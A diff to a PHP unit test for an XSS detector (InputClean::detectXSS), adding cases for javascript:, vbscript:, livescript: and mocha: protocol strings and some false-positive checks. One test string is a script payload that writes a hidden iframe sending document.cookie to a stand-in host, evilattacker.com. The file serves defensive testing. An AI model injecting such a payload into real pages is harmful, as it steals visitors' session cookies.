@@ -393,6 +393,7 @@ class InputCleanTest extends AppTestCase {
 	}
 
 	public function testDetectXSS() {
+
 		$v = 'foobar<script>document.write(\'<iframe src="http://evilattacker.com?cookie=\'' . "\n" .
 		' + document.cookie.escape() + \'" height=0 width=0 />\');</script>foobar';
 		$this->assertTrue(InputClean::detectXSS($v));
@@ -407,8 +408,40 @@ class InputCleanTest extends AppTestCase {
 		$v = 'foobar <a href="#" class="badstuff">foo</a>bar';
 		$this->assertFalse(InputClean::detectXSS($v));
 
+		// fixed a problem with "data:123" matching
+		$v = 'foobar data:100 yxz';
+		$this->assertFalse(InputClean::detectXSS($v));
+		$v = 'data:100';
+		$this->assertFalse(InputClean::detectXSS($v));
+
+		// some more known "bad" values
+		//   javascript:, livescript:, vbscript: and mocha: protocols
+		$v = 'javascript:foobar';
+		$this->assertTrue(InputClean::detectXSS($v));
+		$v = 'foobar javascript:foobar xyz';
+		$this->assertTrue(InputClean::detectXSS($v));
+		$v = 'foobarjavascript:foobarxyz';
+		$this->assertTrue(InputClean::detectXSS($v));
+		$v = 'foobarvbscript:foobarxyz';
+		$this->assertTrue(InputClean::detectXSS($v));
+		$v = 'foobarlivescript:foobarxyz';
+		$this->assertTrue(InputClean::detectXSS($v));
+		$v = 'foobarmocha:foobarxyz';
+		$this->assertTrue(InputClean::detectXSS($v));
+		// does not match script: protocol
+		$v = 'foobarscript:foobarxyz';
+		$this->assertFalse(InputClean::detectXSS($v));
+		// does not match javascript= protocol
+		$v = 'foobar javascript=foobar xyz';
+		$this->assertFalse(InputClean::detectXSS($v));
+		// does not match javascript protocol
+		$v = 'foobar javascript xyz';
+		$this->assertFalse(InputClean::detectXSS($v));
+
 		// TODO: more tests to demonstrate functionality
 	}
+
+
 
 	// demonstrate that <email@example.com> is not stripped
 	//   even though it normally would be in PHP, without this tokenize process
